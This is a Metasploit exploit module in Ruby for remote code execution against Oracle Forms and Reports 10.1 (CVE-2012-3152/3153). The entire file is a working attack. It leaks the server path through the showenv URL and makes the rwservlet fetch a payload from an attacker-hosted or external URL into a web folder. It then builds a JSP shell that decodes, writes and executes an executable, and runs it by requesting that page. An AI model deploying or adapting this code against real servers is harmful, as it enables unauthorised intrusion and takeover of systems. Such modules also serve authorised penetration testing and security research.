# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;
require &#039;uri&#039;

class Metasploit3 < Msf::Exploit::Remote

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::HttpServer::HTML
  include Msf::Exploit::EXE

  Rank = GreatRanking

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;            => &#039;Oracle Forms and Reports Remote Code Execution&#039;,
      &#039;Description&#039;     => %q{
      This module uses two vulnerabilities in Oracle forms and reports to get remote code execution
      on the host. The showenv url can be used to disclose information about a server. A second
      vulnerability that allows arbitrary reading and writing to the host filesystem can then be
      vulnerability.

      The local path being accessable from an URL then allows us to perform the remote code
      execution using for example a .jsp shell.

      Tested on Windows and Oracle Forms and Reports 10.1.
      },
      &#039;Author&#039;          =>
        [
          &#039;miss_sudo <security[at]netinfiltration.com>&#039;, # Vulnerability discovery
          &#039;Mekanismen <mattias[at]gotroot.eu>&#039; # Metasploit module
        ],
      &#039;License&#039;         => MSF_LICENSE,
      &#039;References&#039;      =>
        [
          [ "CVE", "2012-3152" ],
          [ "CVE", "2012-3153" ],
          [ "OSVDB", "86395" ], # Matches CVE-2012-3152
          [ "OSVDB", "86394" ], # Matches CVE-2012-3153
          [ "EDB", "31253" ],
          [ &#039;URL&#039;, "http://netinfiltration.com" ]
        ],
      &#039;Stance&#039;          => Msf::Exploit::Stance::Aggressive,
      &#039;Platform&#039;        => [&#039;win&#039;, &#039;linux&#039;],
      &#039;Targets&#039;         =>
        [
          [ &#039;Linux&#039;,
            {
            &#039;Arch&#039; => ARCH_X86,
            &#039;Platform&#039; => &#039;linux&#039;
            }
          ],
          [ &#039;Windows&#039;,
            {
            &#039;Arch&#039; => ARCH_X86,
            &#039;Platform&#039; => &#039;win&#039;
            }
          ],
        ],
      &#039;DefaultTarget&#039;   => 0,
      &#039;DisclosureDate&#039;  => &#039;Jan 15 2014&#039;
    ))
    register_options(
      [
        OptString.new(&#039;EXTURL&#039;, [false, &#039;An external host to request the payload from&#039;, "" ]),
        OptString.new(&#039;PAYDIR&#039;, [true, &#039;The folder to download the payload to&#039;, "/images/" ]),
        OptInt.new(&#039;HTTPDELAY&#039;, [false, &#039;Time that the HTTP Server will wait for the payload request&#039;, 10]),
      ])
  end

  def check
    res = send_request_cgi({
      &#039;uri&#039; => normalize_uri(target_uri.path, "/reports/rwservlet/showenv"),
      &#039;method&#039; => &#039;GET&#039;
      })

    if res and res.code == 200
      if res.body =~ /\\(.*)\\showenv/
        vprint_good "#{peer} - Windows install detected "
        path = $1.gsub("\\", "/")
        vprint_status "#{peer} - Path:  #{path}"
      elsif res.body =~ /\/(.*)\/showenv/
        vprint_good "#{peer} - Linux install detected"
        vprint_status "#{peer} - Path:  #{$1}"
      else
        return Exploit::CheckCode::Safe
      end
    end

    res = send_request_cgi({
      &#039;uri&#039; => normalize_uri(target_uri.path, "/reports/rwservlet"),
      &#039;method&#039; => &#039;GET&#039;,
       &#039;vars_get&#039; => {
       &#039;report&#039; => &#039;test.rdf&#039;,
       &#039;desformat&#039; => &#039;html&#039;,
       &#039;destype&#039; => &#039;cache&#039;,
       &#039;JOBTYPE&#039; => &#039;rwurl&#039;,
       &#039;URLPARAMETER&#039; => &#039;file:///&#039;
       }
      })

    if res and res.code == 200 and res.body.downcase.exclude?("<html>")
      vprint_good "#{peer} - URLPARAMETER is vulnerable"
      return Exploit::CheckCode::Vulnerable
    else
      vprint_status "#{peer} - URLPARAMETER is not vulnerable"
      return Exploit::CheckCode::Safe
    end

    return Exploit::CheckCode::Safe
  end

  def exploit
    @payload_url = ""
    @payload_name = rand_text_alpha(8+rand(8)) + ".jsp"
    @payload_dir = datastore[&#039;PAYDIR&#039;]
    @local_path = ""

    print_status "#{peer} - Querying showenv!"
    res = send_request_cgi({
      &#039;uri&#039; => normalize_uri(target_uri.path, "/reports/rwservlet/showenv"),
      &#039;method&#039; => &#039;GET&#039;,
      })

    if res and res.code == 200
      if res.body =~ /\\(.*)\\showenv/
        print_good "#{peer} - Query succeeded!"
        print_status "#{peer} - Windows install detected "
        @local_path = $1.gsub("\\", "/")
        print_status "#{peer} - Path: #{@local_path }"
      elsif res.body =~ /\/(.*)\/showenv/
        print_good "#{peer} - Query succeeded!"
        print_status "#{peer} - Linux install detected"
        @local_path = $1
        print_status "#{peer} - Path:  #{@local_path }"
      else
        print_status "#{peer} - Query failed"
        fail_with(Failure::Unknown, "#{peer} - target is not vulnerable or unreachable")
      end
    else
      fail_with(Failure::Unknown, "#{peer} - target is not vulnerable or unreachable")
    end

    if datastore[&#039;EXTURL&#039;].blank?
      print_status "#{peer} - Hosting payload locally ..."
      begin
        Timeout.timeout(datastore[&#039;HTTPDELAY&#039;]) {super}
      rescue Timeout::Error
      end
      exec_payload
    else
      print_status "#{peer} - Using external url for payload delivery ..."
      @payload_url = datastore[&#039;EXTURL&#039;]
      upload_payload
      exec_payload
    end
  end

  def primer
    @payload_url = get_uri
    @pl = gen_file_dropper
    upload_payload
  end

  def on_request_uri(cli, request)
    send_response(cli, @pl)
  end

  def upload_payload
    print_status "#{peer} - Uploading payload ..."
    path = "/#{@local_path}#{@payload_dir}#{@payload_name}"
    res = send_request_cgi({
      &#039;uri&#039; => normalize_uri(target_uri.path, "/reports/rwservlet"),
      &#039;method&#039; => &#039;GET&#039;,
      &#039;encode_params&#039; => false,
      &#039;vars_get&#039; => {
        &#039;report&#039; => &#039;test.rdf&#039;,
        &#039;desformat&#039; => &#039;html&#039;,
        &#039;destype&#039; => &#039;file&#039;,
        &#039;desname&#039; => path,
        &#039;JOBTYPE&#039; => &#039;rwurl&#039;,
        &#039;URLPARAMETER&#039; => @payload_url
       }
    })

    if res and res.code == 200
      print_good "#{peer} - Payload hopefully uploaded!"
    else
      print_status "#{peer} - Payload upload failed"
    end
  end

  def gen_file_dropper
    big_payload =  false #size matters :(

    gen_payload_name  = rand_text_alpha(8+rand(8))
    encoded_pl  = Rex::Text.encode_base64(generate_payload_exe)
    print_status "#{peer} - Building JSP shell ..."

    len = encoded_pl.length
    if len >= 60000 #java string size limit ~60k workaround
      print_status "#{peer} - Adjusting shell due to payload size"
      pl_first = encoded_pl.slice(0, 60000)
      pl_second = encoded_pl.slice(60000, len)
      big_payload = true
    end

    #embed our payload
    shell  = "<%@ page import=\"java.util.*,java.io.*, sun.misc.BASE64Decoder\"%>"
    shell += " <%"
    shell += " BASE64Decoder decoder = new BASE64Decoder();"
    #correct file suffix if windows
    if datastore[&#039;TARGET&#039;] == 1
      shell += " File temp = File.createTempFile(\"#{gen_payload_name}\", \".exe\");"
    else
      shell += " File temp = File.createTempFile(\"#{gen_payload_name}\", \".tmp\");"
    end
    shell += " String path = temp.getAbsolutePath();"
    if big_payload
      shell += " byte [] pl = decoder.decodeBuffer(\"#{pl_first}\");"
      shell += " byte [] pltwo = decoder.decodeBuffer(\"#{pl_second}\");"

      shell += " BufferedOutputStream ou = new BufferedOutputStream(new FileOutputStream(path));"
      shell += " ou.write(pl);"
      shell += " ou.close();"

      shell += " ou = new BufferedOutputStream(new FileOutputStream(path, true));"
      shell += " ou.write(pltwo);"
      shell += " ou.close();"
    else
      shell += " byte [] pl = decoder.decodeBuffer(\"#{encoded_pl}\");"
      shell += " BufferedOutputStream ou = new BufferedOutputStream(new FileOutputStream(path));"
      shell += " ou.write(pl);"
      shell += " ou.close();"
    end
    #correct rights if linux host
    if datastore[&#039;TARGET&#039;] == 0
      shell += " Process p = Runtime.getRuntime().exec(\"/bin/chmod 700 \" + path);"
      shell += " p.waitFor();"
    end
    shell += " Runtime.getRuntime().exec(path);"
    shell += "%>"

    return shell
  end

  def exec_payload
    print_status("#{peer} - Our payload is at: /reports#{@payload_dir}#{@payload_name}")
    print_status("#{peer} - Executing payload...")

    res = send_request_cgi({
      &#039;uri&#039; => normalize_uri(target_uri.path, "reports", @payload_dir, @payload_name),
      &#039;method&#039; => &#039;GET&#039;
    })

    if res and res.code == 200
       print_good("#{peer} - Payload executed!")
    else
       print_status("#{peer} - Payload execution failed")
    end
  end
end

